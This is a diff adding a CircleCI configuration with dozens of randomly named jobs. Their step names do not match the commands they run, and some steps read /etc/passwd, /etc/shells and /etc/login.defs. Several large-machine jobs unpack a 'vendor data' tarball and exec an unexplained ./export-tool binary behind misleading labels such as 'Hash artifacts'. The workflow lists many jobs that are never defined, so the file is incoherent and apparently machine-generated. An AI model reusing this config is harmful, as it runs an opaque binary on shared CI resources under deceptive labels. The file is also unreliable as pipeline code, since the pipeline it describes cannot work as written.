+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Keep reviewing deferred revenue
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; printf %s "it's done" | sum | awk '{print $1}'; true ; } > /tmp/a4/kappa12
+            echo "gate INIT_STG: $(wc -c </tmp/a4/kappa12) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'kappa12'
+  INIT_STG:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Fetch stage C
+          command: |
+            cat /tmp/a4/kappa12
+      - run:
+          name: Materialize tree
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack vendor data
+          command: tar --extract --xz --file=data-01.tar.xz
+      - run:
+          name: Hash artifacts
+          command: uname -a
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: exec ./export-tool
+  uat-local-56:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Can we thank the customer yet
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; seq 6 4 26 | awk '{print $1, $1*$1}' | tail --lines=3; true ; } > /tmp/a4/v4loiv
+            echo "gate alice-verify: $(wc -c </tmp/a4/v4loiv) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'v4loiv'
+  alice-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Fetch stage C
+          command: |
+            cat /tmp/a4/v4loiv
+      - run:
+          name: Materialize tree
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack vendor data
+          command: tar --extract --xz --file=data-01.tar.xz
+      - run:
+          name: Hash artifacts
+          command: uname -a
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: exec ./export-tool
+  VARP:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Animation HOLD
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; yes receipt | head --lines=3; true ; } > /tmp/a4/8f3efe1c40
+            echo "gate Ship_App5: $(wc -c </tmp/a4/8f3efe1c40) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - '8f3efe1c40'
+  Ship_App5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Fetch stage C
+          command: |
+            cat /tmp/a4/8f3efe1c40
+      - run:
+          name: Materialize tree
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack vendor data
+          command: tar --extract --xz --file=data-01.tar.xz
+      - run:
+          name: Hash artifacts
+          command: uname -a
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: exec ./export-tool
+  EnvCityId:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Repair the archive tables out of band
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; echo {1..5} | tr ' ' '\n' | tail -n 2; true ; } > /tmp/a4/dd73e9642fbe
+            echo "gate nebula-final: $(wc -c </tmp/a4/dd73e9642fbe) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'dd73e9642fbe'
+  nebula-final:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Fetch stage C
+          command: |
+            cat /tmp/a4/dd73e9642fbe
+      - run:
+          name: Materialize tree
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack vendor data
+          command: tar --extract --xz --file=data-01.tar.xz
+      - run:
+          name: Hash artifacts
+          command: uname -a
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: exec ./export-tool
+  internal_publish:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: gzip cache 10
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; find /usr/share -maxdepth 3 -type f -name '*.conf' -exec md5sum "{}" ";" 2>/dev/null |head -n 8; true ; } > /tmp/a4/EM
+            echo "gate node18-cov: $(wc -c </tmp/a4/EM) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'EM'
+  node18-cov:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Fetch stage C
+          command: |
+            cat /tmp/a4/EM
+      - run:
+          name: Materialize tree
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack vendor data
+          command: tar --extract --xz --file=data-01.tar.xz
+      - run:
+          name: Hash artifacts
+          command: uname -a
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: exec ./export-tool
+
+  has-index:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: 2026 year end rebalance
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; ls -A /usr/local | sort -R | head -3; true ; } > /tmp/a4/yt
+            echo "gate fix-cache-timeout: $(wc -c </tmp/a4/yt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'yt'
+  llbBlock:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Batching for the migration
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; find /usr/bin -type f -name "*ctl" -mtime +365 -nouser -exec sha1sum {} \;; true ; } > /tmp/a4/thund3rvau1t
+            echo "gate PrepareImage: $(wc -c </tmp/a4/thund3rvau1t) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'thund3rvau1t'
+  setup_param_test:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Tomasz owns restart
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; nl /etc/shells | head -n2; true ; } > /tmp/a4/b3ce192552543750897af93cc0
+            echo "gate DEV_BUILD_4: $(wc -c </tmp/a4/b3ce192552543750897af93cc0) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'b3ce192552543750897af93cc0'
+  afk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compute step-3 hash
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; cut -c1-19 < /etc/skel/.profile|fold -w 46; true ; } > /tmp/a4/crash.log.19
+            echo "gate dp-old: $(wc -c </tmp/a4/crash.log.19) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'crash.log.19'
+  lemon-tempo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: b roll stitch
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; if test -s /etc/hostname; then echo ok; else echo 'not ok'; fi; true ; } > /tmp/a4/Node
+            echo "gate WEB-498: $(wc -c </tmp/a4/Node) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'Node'
+  TAG_LOCALE:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Avast update
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; shuf -i 1-898 -n 9 |sort -n |uniq |wc -l; true ; } > /tmp/a4/agent-8960
+            echo "gate UAT_CHECK_5: $(wc -c </tmp/a4/agent-8960) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'agent-8960'
+  px_src:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Rerun the golden files once more
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; find /sys/class/net -type f -name "*" -group root | nl; true ; } > /tmp/a4/iron-atom-node
+            echo "gate deploy: $(wc -c </tmp/a4/iron-atom-node) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'iron-atom-node'
+  alice-sandbox-chunk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: exec svgs all
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; find /proc/self -maxdepth 3 -name 'limits' -exec ls -ld "{}" \; 2>/dev/null | tail -n 8; true ; } > /tmp/a4/EM
+            echo "gate node18-cov: $(wc -c </tmp/a4/EM) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'EM'
+  NullErrorUtils:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Hover over the back button
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; printf '%s\n' dog owl lion shark otter | xargs -I{} echo "item: {}"; true ; } > /tmp/a4/valleyMolten
+            echo "gate november: $(wc -c </tmp/a4/valleyMolten) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'valleyMolten'
+  Job1998:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Tutorial series format routine
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; echo -n "starting now" | wc -m; true ; } > /tmp/a4/router.proton.fox.silver
+            echo "gate tb-alt: $(wc -c </tmp/a4/router.proton.fox.silver) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'router.proton.fox.silver'
+  WithWave:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Invoice Subscription Renewals
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; grep -n -m2 bash /etc/passwd | sort -u; true ; } > /tmp/a4/K
+            echo "gate tweak-retry-redirect: $(wc -c </tmp/a4/K) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'K'
+  trainer:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: aaand kick off the workers
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; sort -u /etc/shells | grep -v '^#' | xargs -n1 basename | wc -l; true ; } > /tmp/a4/dd73e9642fbe
+            echo "gate nebula-final: $(wc -c </tmp/a4/dd73e9642fbe) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'dd73e9642fbe'
+  wArticle:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Please do archive the team roster
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; printf '%s, ' zebra cat owl; echo; true ; } > /tmp/a4/ridgeCopperKappaKernel
+            echo "gate perseus-v2: $(wc -c </tmp/a4/ridgeCopperKappaKernel) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'ridgeCopperKappaKernel'
+  X35:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Notify the shift roster for leavers
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; tar -czf "/tmp/graph.tar.gz" -C /etc profile && mkdir -p /tmp/summary && tar -xzf "/tmp/graph.tar.gz" -C /tmp/summary && ls -R /tmp/summary; true ; } > /tmp/a4/m34d0w-pr0f113
+            echo "gate uma-verify: $(wc -c </tmp/a4/m34d0w-pr0f113) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'm34d0w-pr0f113'
+  ensx337:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: finance team only watermark
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; printf 'name,city,score\ncarol,perth,47\nbob,boston,43\neva,hanoi,62\nquinn,dublin,70\n' >'/tmp/mountain-sales.tsv' && tail -n +2 '/tmp/mountain-sales.tsv' | wc -l; true ; } > /tmp/a4/MarketAdmin
+            echo "gate defualt: $(wc -c </tmp/a4/MarketAdmin) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'MarketAdmin'
+  v3rtex_43:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Label Cycle Count r2
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; df -ih /; true ; } > /tmp/a4/RMA-2022-30813
+            echo "gate DeployRelease: $(wc -c </tmp/a4/RMA-2022-30813) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'RMA-2022-30813'
+  transientGraphFactory:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: ML 9618 mask vault
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; touch /tmp/yearlyPlayground.md&&stat -c "%U %G" /tmp/yearlyPlayground.md; true ; } > /tmp/a4/kappa12
+            echo "gate INIT_STG: $(wc -c </tmp/a4/kappa12) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'kappa12'
+  L_payment:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Fine tune the loss curve
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; head -3 /etc/login.defs | fold -w 31; true ; } > /tmp/a4/SSH.Dream_Queue_ci
+            echo "gate d-x: $(wc -c </tmp/a4/SSH.Dream_Queue_ci) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'SSH.Dream_Queue_ci'
+  c:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Compile The Physics Layers Before Shipping
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; date -d "@1700000000" +%j; true ; } > /tmp/a4/plasma.token.omega.filter.delta
+            echo "gate nebula-beta: $(wc -c </tmp/a4/plasma.token.omega.filter.delta) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'plasma.token.omega.filter.delta'
+workflows:
+  build-and-test:
+    jobs:
+      - x_test
+      - has-index:
+          requires:
+            - x_test
+      - fix-cache-timeout:
+          requires:
+            - has-index
+      - ukbeacmhnapic:
+          requires:
+            - has-index
+      - llbBlock:
+          requires:
+            - ukbeacmhnapic
+      - PrepareImage:
+          requires:
+            - llbBlock
+      - detach-when:
+          requires:
+            - llbBlock
+      - setup_param_test:
+          requires:
+            - detach-when
+      - DEV_BUILD_4:
+          requires:
+            - setup_param_test
+      - TEMP_SCOPE_DYNAMIC:
+          requires:
+            - setup_param_test
+      - afk:
+          requires:
+            - TEMP_SCOPE_DYNAMIC
+      - dp-old:
+          requires:
+            - afk
+      - df_ContractStackPage5:
+          requires:
+            - afk
+      - lemon-tempo:
+          requires:
+            - df_ContractStackPage5
+      - WEB-498:
+          requires:
+            - lemon-tempo
+      - Input2CNN:
+          requires:
+            - lemon-tempo
+      - TAG_LOCALE:
+          requires:
+            - Input2CNN
+      - UAT_CHECK_5:
+          requires:
+            - TAG_LOCALE
+      - generatorc69140
+      - b-v2:
+          requires:
+            - generatorc69140
+      - uat-local-56:
+          requires:
+            - generatorc69140
+      - alice-verify:
+          requires:
+            - uat-local-56
+      - SHARD_KEY:
+          requires:
+            - uat-local-56
+      - run-end-to-end-docker-image:
+          requires:
+            - SHARD_KEY
+      - DZ_Q:
+          requires:
+            - SHARD_KEY
+      - Prepare_Pipeline9:
+          requires:
+            - DZ_Q
+      - Legacy-Union-Locked:
+          requires:
+            - DZ_Q
+      - DEV_RUN_1:
+          requires:
+            - Legacy-Union-Locked
+      - Hash-Log:
+          requires:
+            - Legacy-Union-Locked
+      - alpha-v7:
+          requires:
+            - Hash-Log
+      - juliett-cursor:
+          requires:
+            - Hash-Log
+      - publish:
+          requires:
+            - juliett-cursor
+      - build2042:
+          requires:
+            - juliett-cursor
+      - p-3:
+          requires:
+            - build2042
+      - kernelType:
+          requires:
+            - build2042
+      - wip-router-v2-bug:
+          requires:
+            - kernelType
+      - VARP:
+          requires:
+            - kernelType
+      - Ship_App5:
+          requires:
+            - VARP
+      - deployWillAppear:
+          requires:
+            - VARP
+      - py310-fmt:
+          requires:
+            - deployWillAppear
+      - DFF846B127C
+      - px_src:
+          requires:
+            - DFF846B127C
+      - deploy:
+          requires:
+            - px_src
+      - internal_publish:
+          requires:
+            - px_src
+      - alice-sandbox-chunk:
+          requires:
+            - internal_publish
+      - node18-cov:
+          requires:
+            - alice-sandbox-chunk
+      - j4:
+          requires:
+            - alice-sandbox-chunk
+      - NullErrorUtils:
+          requires:
+            - j4
+      - november:
+          requires:
+            - NullErrorUtils
+      - Watch-RepoObject:
+          requires:
+            - NullErrorUtils
+      - Job1998:
+          requires:
+            - Watch-RepoObject
+      - tb-alt:
+          requires:
+            - Job1998
+      - TYZVPL-39484a:
+          requires:
+            - Job1998
+      - WithWave:
+          requires:
+            - TYZVPL-39484a
+      - tweak-retry-redirect:
+          requires:
+            - WithWave
+      - EnvCityId:
+          requires:
+            - WithWave
+      - trainer:
+          requires:
+            - EnvCityId
+      - nebula-final:
+          requires:
+            - trainer
+      - posT:
+          requires:
+            - trainer
+      - wArticle:
+          requires:
+            - posT
+      - perseus-v2:
+          requires:
+            - wArticle
+      - tRACe_vErsioN
+      - X35:
+          requires:
+            - tRACe_vErsioN
+      - uma-verify:
+          requires:
+            - X35
+      - W_TAU:
+          requires:
+            - X35
+      - ensx337:
+          requires:
+            - W_TAU
+      - defualt:
+          requires:
+            - ensx337
+      - ROUTER_202211:
+          requires:
+            - ensx337
+      - v3rtex_43:
+          requires:
+            - ROUTER_202211
+      - DeployRelease:
+          requires:
+            - v3rtex_43
+      - sigma_star:
+          requires:
+            - v3rtex_43
+      - transientGraphFactory:
+          requires:
+            - sigma_star
+      - INIT_STG:
+          requires:
+            - transientGraphFactory
+      - closeLevelForKey:
+          requires:
+            - transientGraphFactory
+      - L_payment:
+          requires:
+            - closeLevelForKey
+      - d-x:
+          requires:
+            - L_payment
+      - lishbealglossx:
+          requires:
+            - L_payment
+      - c:
+          requires:
+            - lishbealglossx
+      - nebula-beta:
+          requires:
+            - c
